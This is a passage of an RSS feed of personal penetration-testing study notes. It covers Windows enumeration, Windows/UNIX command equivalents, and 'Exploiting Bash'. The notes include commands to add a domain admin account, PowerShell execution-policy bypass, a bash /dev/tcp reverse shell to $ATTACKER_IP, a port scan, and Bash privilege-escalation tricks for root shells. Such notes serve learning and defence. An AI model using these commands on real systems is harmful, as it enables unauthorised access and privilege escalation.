&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;net user &lt;span class=&quot;va&quot;&gt;$USERNAME&lt;/span&gt; /add /domain&lt;/span&gt;
&lt;span id=&quot;cb1-8&quot;&gt;&lt;a href=&quot;#cb1-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-9&quot;&gt;&lt;a href=&quot;#cb1-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Make a user a domain admin&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-10&quot;&gt;&lt;a href=&quot;#cb1-10&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-11&quot;&gt;&lt;a href=&quot;#cb1-11&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;net &lt;span class=&quot;fu&quot;&gt;group&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;Domain Admins&amp;quot;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$USERNAME&lt;/span&gt; /add /domain&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;netstat&quot;&gt;netstat&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;netstat&lt;/code&gt; command on Windows &lt;em&gt;almost&lt;/em&gt; works exactly like its Linux equivalent. The difference is that &lt;code&gt;-o&lt;/code&gt; displays the PID of the process using the connection on Windows (which, IMHO, is more useful than &lt;code&gt;-o&lt;/code&gt; on Linux).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20%22netstat%22.md&quot;&gt;Using &quot;netstat&quot;&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;systeminfo&quot;&gt;systeminfo&lt;/h2&gt;&lt;p&gt;Use &lt;code&gt;findstr&lt;/code&gt; to filter the output of &lt;code&gt;systeminfo&lt;/code&gt;:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;systeminfo | findstr /B /C:&lt;span class=&quot;st&quot;&gt;&amp;quot;OS Name&amp;quot;&lt;/span&gt; /C:&lt;span class=&quot;st&quot;&gt;&amp;quot;OS Version&amp;quot;&lt;/span&gt; /C:&lt;span class=&quot;st&quot;&gt;&amp;quot;System Type&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;wmic&quot;&gt;wmic&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;wmic&lt;/code&gt; command is extremely useful, but is also deprecated (&lt;em&gt;because&lt;/em&gt; of its usefulness to attackers!). It can be used on Windows 10 21H1 and earlier. For later systems, PowerShell command-lets will need to be used instead (which increases the risk that activity will be logged).&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;wmic product&lt;/code&gt; - list all installed software (but misses 32-bit applications installed on a 64-bit OS)&lt;/li&gt;&lt;li&gt;&lt;code&gt;wmic service get name,displayname,pathname,startmode&lt;/code&gt; - list all services&lt;/li&gt;&lt;li&gt;&lt;code&gt;wmic qfe get Caption,Description,HotFixID,InstalledOn&lt;/code&gt; - list installed updates&lt;/li&gt;&lt;li&gt;&lt;code&gt;wimc service list brief&lt;/code&gt; - another way of listing services&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;useful-scripts&quot;&gt;Useful Scripts&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&quot;&gt;WinPEAS&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc&quot;&gt;PowerUp&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/AonCyberLabs/Windows-Exploit-Suggester&quot;&gt;Windows Exploit Suggester&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/./Using%20Metasploit.md&quot;&gt;Metasploit&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;Notes:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;WinPEAS is detected and quarantined by Microsoft Defender (service &lt;code&gt;windefend&lt;/code&gt;) by default.&lt;/li&gt;&lt;li&gt;PowerUp may require an unrestricted PowerShell session (&lt;code&gt;powershell -nop -exec bypass&lt;/code&gt;), which can raise alerts.&lt;/li&gt;&lt;li&gt;Windows Exploit Suggester analyzes the output of &lt;code&gt;systeminfo&lt;/code&gt;, and can be run on the attacker's machine.&lt;/li&gt;&lt;li&gt;The &lt;code&gt;multi/recon/local_exploit_suggester&lt;/code&gt; module works through Meterpreter to analyze a Windows system for potential vulnerabilities.&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Enumerate%20Windows%20Environments.md</guid>
		</item>
		<item>
			<title>Equivalent Windows and UNIX Commands</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Equivalent%20Windows%20and%20UNIX%20Commands.md</link>
			<description>&lt;p&gt;UNIX âï¸ Windows command equivalencies (more-or-less):&lt;/p&gt;&lt;ul&gt;&lt;li&gt;cat âï¸ type&lt;/li&gt;&lt;li&gt;dig âï¸ nslookup&lt;/li&gt;&lt;li&gt;grep âï¸ findstr / select&lt;/li&gt;&lt;li&gt;ifconfig âï¸ ipconfig&lt;/li&gt;&lt;li&gt;ls âï¸ dir&lt;/li&gt;&lt;li&gt;more âï¸ more&lt;/li&gt;&lt;li&gt;netstat âï¸ netstat&lt;/li&gt;&lt;li&gt;ping âï¸ ping&lt;/li&gt;&lt;li&gt;shutdown âï¸ shutdown&lt;/li&gt;&lt;li&gt;sleep âï¸ timeout&lt;/li&gt;&lt;li&gt;sudo âï¸ runas&lt;/li&gt;&lt;li&gt;tcpdump âï¸ windump&lt;/li&gt;&lt;li&gt;traceroute âï¸ tracert&lt;/li&gt;&lt;li&gt;wget âï¸ wget&lt;/li&gt;&lt;li&gt;hostname âï¸ hostname&lt;/li&gt;&lt;li&gt;whoami âï¸ whoami&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;cat&quot;&gt;cat&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Use cat to add line numbers to a file!&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-2&quot;&gt;&lt;a href=&quot;#cb1-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-3&quot;&gt;&lt;a href=&quot;#cb1-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; -n &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-4&quot;&gt;&lt;a href=&quot;#cb1-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-5&quot;&gt;&lt;a href=&quot;#cb1-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Only number non-blank lines&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-6&quot;&gt;&lt;a href=&quot;#cb1-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb1-7&quot;&gt;&lt;a href=&quot;#cb1-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;cat&lt;/span&gt; -b &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://superuser.com/questions/434870/what-is-the-windows-equivalent-of-the-unix-command-cat#434876&quot;&gt;What is the Windows equivalent of the Unix command cat?&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;dig&quot;&gt;dig&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# dig command syntax; only $DOMAIN is required&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-2&quot;&gt;&lt;a href=&quot;#cb2-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-3&quot;&gt;&lt;a href=&quot;#cb2-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dig&lt;/span&gt; @&lt;span class=&quot;va&quot;&gt;$NAME_SERVER&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$QUERY_TYPE&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-4&quot;&gt;&lt;a href=&quot;#cb2-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-5&quot;&gt;&lt;a href=&quot;#cb2-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Examples&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-6&quot;&gt;&lt;a href=&quot;#cb2-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb2-7&quot;&gt;&lt;a href=&quot;#cb2-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dig&lt;/span&gt; @8.8.8.8 microsoft.com A&lt;/span&gt;
&lt;span id=&quot;cb2-8&quot;&gt;&lt;a href=&quot;#cb2-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dig&lt;/span&gt; @1.1.1.1 tryhackme.com&lt;/span&gt;
&lt;span id=&quot;cb2-9&quot;&gt;&lt;a href=&quot;#cb2-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;ex&quot;&gt;dig&lt;/span&gt;          google.com    MX&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;grep&quot;&gt;grep&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Case-insensitive grep&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-3&quot;&gt;&lt;a href=&quot;#cb3-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; -i &lt;span class=&quot;va&quot;&gt;$STRING&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$FILE&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-4&quot;&gt;&lt;a href=&quot;#cb3-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-5&quot;&gt;&lt;a href=&quot;#cb3-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Recursive grep of all files in a folder (and its subfolders)&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-6&quot;&gt;&lt;a href=&quot;#cb3-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb3-7&quot;&gt;&lt;a href=&quot;#cb3-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$STRING&lt;/span&gt; -r &lt;span class=&quot;va&quot;&gt;$DIRECTORY&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;findstr&quot;&gt;findstr&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb4-1&quot;&gt;&lt;a href=&quot;#cb4-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Use findstr to filter the output of systeminfo (or another command):&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-2&quot;&gt;&lt;a href=&quot;#cb4-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb4-3&quot;&gt;&lt;a href=&quot;#cb4-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;systeminfo | findstr /B /C:&lt;span class=&quot;st&quot;&gt;&amp;quot;OS Name&amp;quot;&lt;/span&gt; /C:&lt;span class=&quot;st&quot;&gt;&amp;quot;OS Version&amp;quot;&lt;/span&gt; /C:&lt;span class=&quot;st&quot;&gt;&amp;quot;System Type&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;dir&quot;&gt;dir&lt;/h2&gt;&lt;p&gt;The &lt;code&gt;dir&lt;/code&gt; command accepts wildcard listings (&lt;code&gt;*.txt&lt;/code&gt;, etc.), and will perform a subdirectory search if given the &lt;code&gt;/S&lt;/code&gt; flag. For example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb5&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb5-1&quot;&gt;&lt;a href=&quot;#cb5-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;dir&lt;/span&gt; /S /P example.&lt;span class=&quot;fu&quot;&gt;txt&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;ipconfig&quot;&gt;ipconfig&lt;/h2&gt;&lt;h3 id=&quot;display-current-dns-settings&quot;&gt;Display Current DNS Settings&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb6&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb6-1&quot;&gt;&lt;a href=&quot;#cb6-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;ipconfig /displaydns | more&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&quot;flush-local-dns-cache&quot;&gt;Flush Local DNS Cache&lt;/h3&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb7&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb7-1&quot;&gt;&lt;a href=&quot;#cb7-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;ipconfig /flushdns&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;nslookup&quot;&gt;nslookup&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb8&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb8-1&quot;&gt;&lt;a href=&quot;#cb8-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# nslookup command syntax; only $DOMAIN is required&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-2&quot;&gt;&lt;a href=&quot;#cb8-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-3&quot;&gt;&lt;a href=&quot;#cb8-3&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;nslookup -type=&lt;span class=&quot;va&quot;&gt;$QUERY_TYPE&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$NAME_SERVER&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-4&quot;&gt;&lt;a href=&quot;#cb8-4&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-5&quot;&gt;&lt;a href=&quot;#cb8-5&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;# Examples&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-6&quot;&gt;&lt;a href=&quot;#cb8-6&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;co&quot;&gt;#&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-7&quot;&gt;&lt;a href=&quot;#cb8-7&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;nslookup -type=A  microsoft.&lt;span class=&quot;fu&quot;&gt;com&lt;/span&gt; 8.&lt;span class=&quot;fu&quot;&gt;8&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;8&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;8&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-8&quot;&gt;&lt;a href=&quot;#cb8-8&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;nslookup          tryhackme.&lt;span class=&quot;fu&quot;&gt;com&lt;/span&gt; 1.&lt;span class=&quot;fu&quot;&gt;1&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;1&lt;/span&gt;.&lt;span class=&quot;fu&quot;&gt;1&lt;/span&gt;&lt;/span&gt;
&lt;span id=&quot;cb8-9&quot;&gt;&lt;a href=&quot;#cb8-9&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;nslookup -type=MX google.&lt;span class=&quot;fu&quot;&gt;com&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;ping&quot;&gt;ping&lt;/h2&gt;&lt;p&gt;Windows &lt;code&gt;ping&lt;/code&gt; uses the &lt;code&gt;-n&lt;/code&gt; flag to specify the number of packets sent (in contrast to Linux's &lt;code&gt;-c&lt;/code&gt;).&lt;/p&gt;&lt;h2 id=&quot;runas&quot;&gt;runas&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb9&quot;&gt;&lt;pre class=&quot;sourceCode powershell&quot;&gt;&lt;code class=&quot;sourceCode powershell&quot;&gt;&lt;span id=&quot;cb9-1&quot;&gt;&lt;a href=&quot;#cb9-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;runas /user:&lt;span class=&quot;va&quot;&gt;$USERNAME&lt;/span&gt; &lt;span class=&quot;va&quot;&gt;$EXECUTABLE&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;$USERNAME&lt;/code&gt; may also be specified as &lt;code&gt;$DOMAIN\$USERNAME&lt;/code&gt; for domain-joined machines.&lt;/p&gt;&lt;p&gt;&lt;code&gt;$EXECUTABLE&lt;/code&gt; is treated normally (as if not prefixed by the &lt;code&gt;runas&lt;/code&gt; command), so a full or relative path is only necessary when it's not already in the Windows path.&lt;/p&gt;&lt;p&gt;If credentials are saved for a particular user (use &lt;code&gt;cmdkey /list&lt;/code&gt; to check), then the &lt;code&gt;/savecred&lt;/code&gt; flag will apply them automatically!&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://www.shellhacks.com/windows-run-as-different-user/&quot;&gt;Windows: Run as Different User&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://www.windows-commandline.com/windows-runas-command-prompt/&quot;&gt;Windows runas command syntax and examples&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;whoami&quot;&gt;whoami&lt;/h2&gt;&lt;p&gt;Windows' &lt;code&gt;whoami&lt;/code&gt; supports a couple of useful flags:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;code&gt;/all&lt;/code&gt; - return detailed user information.&lt;/li&gt;&lt;li&gt;&lt;code&gt;/privs&lt;/code&gt; - return information about current user privileges.&lt;/li&gt;&lt;/ul&gt;</description>
			<pubDate>Wed, 19 Apr 2023 14:31:45 +0000</pubDate>
			<guid>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Equivalent%20Windows%20and%20UNIX%20Commands.md</guid>
		</item>
		<item>
			<title>Exploiting Bash</title>
			<link>https://github.com/cardboard-iguana/hacking-notes/blob/main/Notes/Exploiting%20Bash.md</link>
			<description>&lt;h2 id=&quot;a-simple-reverse-shell&quot;&gt;A Simple Reverse Shell&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb1&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb1-1&quot;&gt;&lt;a href=&quot;#cb1-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;fu&quot;&gt;bash&lt;/span&gt; -li &lt;span class=&quot;op&quot;&gt;&amp;amp;&amp;gt;&lt;/span&gt; /dev/tcp/&lt;span class=&quot;va&quot;&gt;$ATTACKER_IP&lt;/span&gt;/&lt;span class=&quot;va&quot;&gt;$LISTENER_PORT&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Catch it with netcat or socat.&lt;/p&gt;&lt;p&gt;(That said, the fact that all of my file descriptors wind up pointing at /dev/tcp is a little mysterious to me. I &lt;em&gt;think&lt;/em&gt; what's happening here is that /dev/tcp is bidirectional &quot;out of the box&quot; - incoming data comes out, just as outgoing data goes in - so binding all three &quot;core&quot; file descriptors to it does the right thing. That, and realize that the &lt;code&gt;X&amp;gt;&amp;amp;Y&lt;/code&gt; construct means &quot;bind file descriptor X to file descriptor Y&quot;, and &lt;code&gt;&amp;amp;&amp;gt;&lt;/code&gt; is just short for &lt;code&gt;2&amp;gt;&amp;amp;1 &amp;gt;&lt;/code&gt;, and &lt;code&gt;&amp;gt;&lt;/code&gt; is just short for &lt;code&gt;1 &amp;gt;&lt;/code&gt;. So really what's happening here is that we bind STDERR to STDOUT with and implicit &lt;code&gt;2&amp;gt;&amp;amp;1&lt;/code&gt;, then bind STDOUT to /dev/tcp with an implicit &lt;code&gt;1 &amp;gt;&lt;/code&gt;, then bind STDIN to /dev/tcp as well with &lt;code&gt;0&amp;gt;&amp;amp;1&lt;/code&gt;.)&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md&quot;&gt;Reverse Shell Cheat Sheet&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;port-scanning&quot;&gt;Port Scanning&lt;/h2&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb2&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb2-1&quot;&gt;&lt;a href=&quot;#cb2-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bu&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;lt;&lt;/span&gt;/dev/tcp/&lt;span class=&quot;va&quot;&gt;$IP_ADDRESS&lt;/span&gt;/&lt;span class=&quot;va&quot;&gt;$PORT&lt;/span&gt;&lt;span class=&quot;kw&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;op&quot;&gt;&amp;amp;&amp;gt;&lt;/span&gt;&lt;span class=&quot;ex&quot;&gt;/dev/null&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;OPEN&amp;quot;&lt;/span&gt; &lt;span class=&quot;kw&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;bu&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;st&quot;&gt;&amp;quot;CLOSED&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;using-wildcard-expansion-to-pass-command-line-options&quot;&gt;Using Wildcard Expansion to Pass Command Line Options&lt;/h2&gt;&lt;p&gt;The wildcard expansion (&lt;code&gt;*&lt;/code&gt;) in Bash scripts doesn't get pushed to the command, but is instead expanded in place. This means that files named like command-line switches &lt;em&gt;will be interpreted as command line switches&lt;/em&gt;. This can be used, for example, to exploit sloppy tar-based backup scripts.&lt;/p&gt;&lt;h2 id=&quot;exploiting-functions-in-bash--42-048&quot;&gt;Exploiting Functions in Bash &amp;lt; 4.2-048&lt;/h2&gt;&lt;p&gt;In versions of Bash &amp;lt; 4.2-048, it's possible to export functions with the same form as absolute paths to files. These functions will then be executed instead of the fully-specified path &lt;em&gt;if&lt;/em&gt; the calling application is relying on the current shell for helper execution.&lt;/p&gt;&lt;p&gt;For example:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb3&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code class=&quot;sourceCode bash&quot;&gt;&lt;span id=&quot;cb3-1&quot;&gt;&lt;a href=&quot;#cb3-1&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;kw&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;ex&quot;&gt;/path/to/executable&lt;/span&gt; { /bin/bash -p&lt;span class=&quot;kw&quot;&gt;;&lt;/span&gt; }&lt;/span&gt;
&lt;span id=&quot;cb3-2&quot;&gt;&lt;a href=&quot;#cb3-2&quot; aria-hidden=&quot;true&quot;&gt;&lt;/a&gt;&lt;span class=&quot;bu&quot;&gt;export&lt;/span&gt; -f /path/to/executable&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&quot;exploiting-ps4-in-bash--44&quot;&gt;Exploiting $PS4 in Bash &amp;lt; 4.4&lt;/h2&gt;&lt;p&gt;When bash is in debugging mode (SHELLOPTS=xtrace), the $PS4 prompt is used to display debugging information.&lt;/p&gt;&lt;p&gt;&lt;em&gt;It would appear that this prompt somehow inherits the permissions of the executable being run.&lt;/em&gt; This includes SUID/SGID permissions (at least for Bash &amp;lt; 4.4)!&lt;/p&gt;&lt;p&gt;If you have access to a SUID/SGID executable, this can be abused to create root shells:&lt;/p&gt;&lt;div class=&quot;sourceCode&quot; id=&quot;cb4&quot;&gt;&lt;pre class=&quot;sourceCode bash&quot;&gt;&lt;code 